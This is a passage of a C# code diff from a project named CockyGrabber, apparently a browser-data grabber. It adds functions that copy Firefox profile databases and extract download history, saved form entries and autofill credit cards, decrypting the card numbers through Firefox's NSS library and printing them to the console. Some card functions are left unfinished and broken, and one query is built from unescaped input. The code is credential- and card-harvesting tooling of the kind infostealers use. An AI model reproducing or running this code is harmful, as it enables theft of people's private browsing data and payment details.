+                if (!DownloadsExist(profile)) return;
 
                 // Copy the database to a temporary location because it could be already in use
                 string tempFile = CopyToTempFile(profile + PlacesPath);
@@ -646,7 +763,7 @@ namespace CockyGrabber.Grabbers
                 using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                 using (var cmd = conn.CreateCommand())
                 {
-                    cmd.CommandText = DownloadCommandText;
+                    cmd.CommandText = DownloadQuery;
 
                     conn.Open();
                     using (var reader = cmd.ExecuteReader())
@@ -674,7 +791,7 @@ namespace CockyGrabber.Grabbers
 
                                 // Add metadata to the temporary download model:
                                 temp.State = state;
-                                temp.EndTime = UnixTimeInSecondsToDate(endtime);
+                                temp.EndTime = Time.FromUnixTimeMilliseconds(endtime);
                                 temp.FileSize = filesize;
 
                                 downloads.Add(temp); // Add temporary model to list
@@ -697,8 +814,8 @@ namespace CockyGrabber.Grabbers
                                     Flags = reader.GetInt16(4),
                                     Expiration = reader.GetInt32(5),
                                     Type = reader.GetInt16(6),
-                                    DateAdded = UnixTimeInMicrosecondsToDate(reader.GetInt64(7)),
-                                    LastModified = UnixTimeInMicrosecondsToDate(reader.GetInt64(8)),
+                                    DateAdded = Time.FromUnixTimeMicroseconds(reader.GetInt64(7)),
+                                    LastModified = Time.FromUnixTimeMicroseconds(reader.GetInt64(8)),
 
                                     Url = (string)_cmd.ExecuteScalar(),
                                     Filename = content.Substring(content.LastIndexOf('/') + 1), // Get the substring of the last '/'. Example: file:///C:/Users/User/Downloads/File.zip = File.zip
@@ -709,14 +826,322 @@ namespace CockyGrabber.Grabbers
                     conn.Dispose();
                 }
                 File.Delete(tempFile);
-            }
+            });
             return downloads;
         }
         #endregion
 
-        // TimeStamp To DateTimeOffset functions:
-        private static DateTimeOffset UnixTimeInSecondsToDate(long seconds) => DateTimeOffset.FromUnixTimeMilliseconds(seconds/* * 1000*/);
-        private static DateTimeOffset UnixTimeInMillisecondsToDate(long milliSeconds) => DateTimeOffset.FromUnixTimeMilliseconds(milliSeconds);
-        private static DateTimeOffset UnixTimeInMicrosecondsToDate(long microSeconds) => DateTimeOffset.FromUnixTimeMilliseconds(microSeconds / 1000);
+        #region GetFormHistory()
+        public IEnumerable<Gecko.Form> GetFormHistoryBy(Gecko.Form.Header by, object value)
+        {
+            List<Gecko.Form> formHistory = new List<Gecko.Form>();
+            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
+            if (!AnyFormHistoryExists()) throw new GrabberException(GrabberError.FormHistoryNotFound, $"No form history databases were found!"); // Throw an Exception if no form history DBs were found
+
+            Parallel.ForEach(_profiles, (profile) =>
+            {
+                if (!FormHistoryExists(profile)) return;
+
+                // Copy the database to a temporary location because it could be already in use
+                string tempFile = CopyToTempFile(profile + FormHistoryPath);
+
+                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
+                using (var cmd = conn.CreateCommand())
+                {
+                    cmd.CommandText = $"{FormHistoryQuery} WHERE {by} = '{value}'";
+
+                    conn.Open();
+                    using (var reader = cmd.ExecuteReader())
+                    {
+                        while (reader.Read())
+                        {
+                            int id = reader.GetInt32(0);
+
+                            // Get the source id which points to the source of the form data:
+                            long sourceId;
+                            using (var _cmd = conn.CreateCommand())
+                            {
+                                _cmd.CommandText = $"SELECT source_id FROM moz_history_to_sources WHERE history_id = {id}";
+
+                                object _sId = _cmd.ExecuteScalar(); // temp
+                                sourceId = _sId == null ? -1 : (long)_sId;
+                            }
+
+                            // Gets the source if it exists:
+                            string source = string.Empty;
+                            if (sourceId > -1) // If sourceId is -1, the form data does not have a source
+                            {
+                                using (var _cmd = conn.CreateCommand())
+                                {
+                                    _cmd.CommandText = $"SELECT source FROM moz_sources WHERE id = {sourceId}";
+                                    source = _cmd.ExecuteScalar() == null ? string.Empty : (string)_cmd.ExecuteScalar();
+                                }
+                            }
+
+                            formHistory.Add(new Gecko.Form()
+                            {
+                                Id = id,
+                                Fieldname = reader.GetString(1),
+                                Value = reader.GetString(2),
+                                TimesUsed = reader.GetInt32(3),
+                                FirstUsed = Time.FromUnixTimeMicroseconds(reader.GetInt64(4)),
+                                LastUsed = Time.FromUnixTimeMicroseconds(reader.GetInt64(5)),
+                                Guid = reader.GetString(6),
+
+                                SourceId = sourceId,
+                                Source = source,
+                            });
+                        }
+                    }
+                    conn.Dispose();
+                }
+                File.Delete(tempFile);
+            });
+            return formHistory;
+        }
+        
+        public IEnumerable<Gecko.Form> GetFormHistory()
+        {
+            List<Gecko.Form> formHistory = new List<Gecko.Form>();
+            if (!AnyFormHistoryExists()) throw new GrabberException(GrabberError.FormHistoryNotFound, $"No form history databases were found!"); // Throw an Exception if no form history DBs were found
+
+            Parallel.ForEach(_profiles, (profile) =>
+            {
+                if (!FormHistoryExists(profile)) return;
+
+                // Copy the database to a temporary location because it could be already in use
+                string tempFile = CopyToTempFile(profile + FormHistoryPath);
+
+                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
+                using (var cmd = conn.CreateCommand())
+                {
+                    cmd.CommandText = FormHistoryQuery;
+
+                    conn.Open();
+                    using (var reader = cmd.ExecuteReader())
+                    {
+                        while (reader.Read())
+                        {
+                            int id = reader.GetInt32(0);
+
+                            // Get the source id which points to the source of the form data:
+                            long sourceId;
+                            using (var _cmd = conn.CreateCommand())
+                            {
+                                _cmd.CommandText = $"SELECT source_id FROM moz_history_to_sources WHERE history_id = {id}";
+
+                                object _sId = _cmd.ExecuteScalar(); // temp
+                                sourceId = _sId == null ? -1 : (long)_sId;
+                            }
+
+                            // Gets the source if it exists:
+                            string source = string.Empty;
+                            if (sourceId > -1) // If sourceId is -1, the form data does not have a source
+                            {
+                                using (var _cmd = conn.CreateCommand())
+                                {
+                                    _cmd.CommandText = $"SELECT source FROM moz_sources WHERE id = {sourceId}";
+                                    source = _cmd.ExecuteScalar() == null ? string.Empty : (string)_cmd.ExecuteScalar();
+                                }
+                            }
+
+                            formHistory.Add(new Gecko.Form()
+                            {
+                                Id = id,
+                                Fieldname = reader.GetString(1),
+                                Value = reader.GetString(2),
+                                TimesUsed = reader.GetInt32(3),
+                                FirstUsed = Time.FromUnixTimeMicroseconds(reader.GetInt64(4)),
+                                LastUsed = Time.FromUnixTimeMicroseconds(reader.GetInt64(5)),
+                                Guid = reader.GetString(6),
+
+                                SourceId = sourceId,
+                                Source = source,
+                            });
+                        }
+                    }
+                    conn.Dispose();
+                }
+                File.Delete(tempFile);
+            });
+            return formHistory;
+        }
+        #endregion
+
+        #region GetCreditCards()
+        /// <summary>
+        /// Converts the as parameter passed dynamic object to a list of Credit Cards
+        /// </summary>
+        /// <param name="ccs">dynamic json object</param>
+        /// <returns>A list of Gecko Credit Cards</returns>
+        private static List<Gecko.CreditCard> ConvertDynamicObjectsToCreditCards(List<object> ccs)
+        {
+            List<Gecko.CreditCard> _ccs = new List<Gecko.CreditCard>();
+            foreach (dynamic obj in ccs)
+            {
+                Gecko.CreditCard.CreditCardType _cc_type = Gecko.CreditCard.CreditCardType.Unknown;
+                switch (obj["cc-type"]) // Switch the credit card type:
+                {
+                    case "visa":
+                        _cc_type = Gecko.CreditCard.CreditCardType.Visa;
+                        break;
+                    case "mastercard":
+                        _cc_type = Gecko.CreditCard.CreditCardType.MasterCard;
+                        break;
+                    case "amex":
+                        _cc_type = Gecko.CreditCard.CreditCardType.AmericanExpress;
+                        break;
+                    case "discover":
+                        _cc_type = Gecko.CreditCard.CreditCardType.Discover;
+                        break;
+                    case "diners":
+                        _cc_type = Gecko.CreditCard.CreditCardType.DinersClub;
+                        break;
+                    case "jcb":
+                        _cc_type = Gecko.CreditCard.CreditCardType.JCB;
+                        break;
+                    case "mir":
+                        _cc_type = Gecko.CreditCard.CreditCardType.Mir;
+                        break;
+                    case "unionpay":
+                        _cc_type = Gecko.CreditCard.CreditCardType.UnionPay;
+                        break;
+                    case "cartebancaire":
+                        _cc_type = Gecko.CreditCard.CreditCardType.CarteBancaire;
+                        break;
+                }
+                string _decVal = GeckoDecryptor.DecryptValue(obj["cc-number-encrypted"]);
+                Console.WriteLine($"'{_decVal}'");
+                Console.WriteLine($"'{long.Parse(_decVal)}'");
+                _ccs.Add(new Gecko.CreditCard
+                {
+                    CC_Number = obj["cc-number"],
+                    CC_ExpirationMonth = (int)obj["cc-exp-month"],
+                    CC_ExpirationYear = (int)obj["cc-exp-year"],
+                    CC_Name = obj["cc-name"],
+                    CC_Type = _cc_type,
+                    Guid = obj["guid"],
+                    Version = obj["version"],
+                    TimeCreated = Time.FromUnixTimeMilliseconds(obj["timeCreated"]),
+                    TimeLastModified = Time.FromUnixTimeMilliseconds(obj["timeLastModified"]),
+                    TimeLastUsed = Time.FromUnixTimeMilliseconds(obj["timeLastUsed"]),
+                    TimesUsed = (int)obj["timesUsed"],
+                    CC_GivenName = obj["cc-given-name"],
+                    CC_AdditionalName = obj["cc-additional-name"],
+                    CC_FamilyName = obj["cc-family-name"],
+                    CC_Expiry = obj["cc-exp"],
+                    CC_NumberEncrypted = obj["cc-number-encrypted"],
+                    CC_NumberDecrypted = long.Parse(_decVal),
+                });
+            }
+            return _ccs;
+        }
+
+        public IEnumerable<Gecko.CreditCard> GetCreditCardsBy(Gecko.CreditCard.Header by, object value)
+        {
+            throw new NotImplementedException();
+            List<Gecko.CreditCard> creditCards = new List<Gecko.CreditCard>();
+            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
+            if (!AnyAutoFillProfilesExists()) throw new GrabberException(GrabberError.CreditCardsNotFound, $"No credit card databases were found!"); // Throw an Exception if no credit card DBs were found
+
+            // Get ProgramFiles Path:
+            string programFiles = Environment.GetEnvironmentVariable("ProgramW6432");
+            if (string.IsNullOrEmpty(programFiles))
+                programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
+
+            // Load NSS:
+            if (!GeckoDecryptor.LoadNSS(programFiles + @"\Mozilla Firefox")) throw new GrabberException(GrabberError.Nss3NotFound, "NSS3 couldn't be loaded!"); // throw an exception if NSS3 couldn't be loaded
+
+            foreach (string profile in Profiles)
+            {
+                if (!AutoFillProfilesExists(profile)) continue;
+
+                if (!GeckoDecryptor.SetProfile(profile)) throw new GrabberException(GrabberError.CouldNotSetProfile, $"Profile could not be set: {profile}"); // throw an Exception if the firefox profile couldn't be set
+
+                dynamic json = JSON_Serializer.Deserialize(File.ReadAllText(profile + AutoFillProfilesPath), typeof(object));
+                foreach (Gecko.CreditCard cc in ConvertDynamicObjectsToCreditCards(json.creditCards))
+                {
+                    switch (by)
+                    {
+                        case Gecko.CreditCard.Header.cc_number:
+                            if (cc.CC_Number == (string)value) creditCards.Add(cc);
+                            break;
+                        case Gecko.CreditCard.Header.cc_exp_month:
+                            if (cc.CC_ExpirationMonth == (int)value) creditCards.Add(cc);
+                            break;
+                        case Gecko.CreditCard.Header.cc_exp_year:
+                            if (cc.CC_ExpirationYear == (int)value) creditCards.Add(cc);
+                            break;
+                        case Gecko.CreditCard.Header.cc_name:
+                            if (cc.CC_Name == (string)value) creditCards.Add(cc);
+                            break;
+                        case Gecko.CreditCard.Header.cc_type:
+                            if (cc.CC_Type == (Gecko.CreditCard.CreditCardType)value) creditCards.Add(cc);
+                            break;
+                        case Gecko.CreditCard.Header.guid:
+                            if (cc.Guid == (string)value) creditCards.Add(cc);
+                            break;
+                        case Gecko.CreditCard.Header.version:
+                            if (cc.Version == (int)value) creditCards.Add(cc);
+                            break;
+                        case Gecko.CreditCard.Header.timeCreated:
+                            if (cc.TimeCreated == (DateTime)value) creditCards.Add(cc);
+                            break;
+                        case Gecko.CreditCard.Header.timeLastModified:
+                            if (cc.TimeLastModified == (DateTime)value) creditCards.Add(cc);
+                            break;
+                        case Gecko.CreditCard.Header.timeLastUsed:
+                            if (cc.TimeLastUsed == (DateTime)value) creditCards.Add(cc);
+                            break;
+                        case Gecko.CreditCard.Header.timesUsed:
+                            if (cc.TimesUsed == (uint)value) creditCards.Add(cc);
+                            break;
+                        case Gecko.CreditCard.Header.cc_given_name:
+                            if (cc.CC_GivenName == (string)value) creditCards.Add(cc);
+                            break;
+                        case Gecko.CreditCard.Header.cc_additional_name:
+                            if (cc.CC_AdditionalName == (string)value) creditCards.Add(cc);
+                            break;
+                        case Gecko.CreditCard.Header.cc_family_name:
+                            if (cc.CC_FamilyName == (string)value) creditCards.Add(cc);
+                            break;
+                        case Gecko.CreditCard.Header.cc_number_encrypted:
+                            if (cc.CC_NumberEncrypted == (string)value) creditCards.Add(cc);
+                            break;
+                    }
+                }
+            }
+            GeckoDecryptor.UnLoadNSS(); // Unload NSS
+            return creditCards;
+        }
+
+        public IEnumerable<Gecko.CreditCard> GetCreditCards()
+        {
+            throw new NotImplementedException();
+            List<Gecko.CreditCard> creditCards = new List<Gecko.CreditCard>();
+            if (!AnyAutoFillProfilesExists()) throw new GrabberException(GrabberError.CreditCardsNotFound, $"No credit card databases were found!"); // Throw an Exception if no credit card DBs were found
+
+            // Get ProgramFiles Path:
+            string programFiles = Environment.GetEnvironmentVariable("ProgramW6432");
+            if (string.IsNullOrEmpty(programFiles))
+                programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
+
+            // Load NSS:
+            if (!GeckoDecryptor.LoadNSS(programFiles + @"\Mozilla Firefox")) throw new GrabberException(GrabberError.Nss3NotFound, "NSS3 couldn't be loaded!"); // throw an exception if NSS3 couldn't be loaded
+
+            foreach (string profile in Profiles)
+            {
+                if (!AutoFillProfilesExists(profile)) continue;
+
+                if (!GeckoDecryptor.SetProfile(profile)) throw new GrabberException(GrabberError.CouldNotSetProfile, $"Profile could not be set: {profile}"); // throw an Exception if the firefox profile couldn't be set
+
+                dynamic json = JSON_Serializer.Deserialize(File.ReadAllText(profile + AutoFillProfilesPath), typeof(object));
+
+                creditCards.Add(ConvertDynamicObjectsToCreditCards(json.creditCards)); // Add ccs
+            }
+            GeckoDecryptor.UnLoadNSS(); // Unload NSS
+            return creditCards;
+        }
+        #endregion
     }
 }
